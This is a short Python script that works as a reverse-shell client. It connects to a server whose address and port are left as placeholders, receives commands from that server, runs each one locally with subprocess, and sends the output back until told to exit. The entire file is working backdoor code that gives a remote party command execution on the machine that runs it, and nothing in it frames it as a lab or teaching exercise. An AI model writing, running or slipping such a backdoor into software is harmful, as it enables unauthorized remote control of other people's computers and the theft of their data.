import socket
import subprocess

SERVER_HOST = "" # Ip server to connect
SERVER_PORT = 0000 # Port to connect
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break

    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
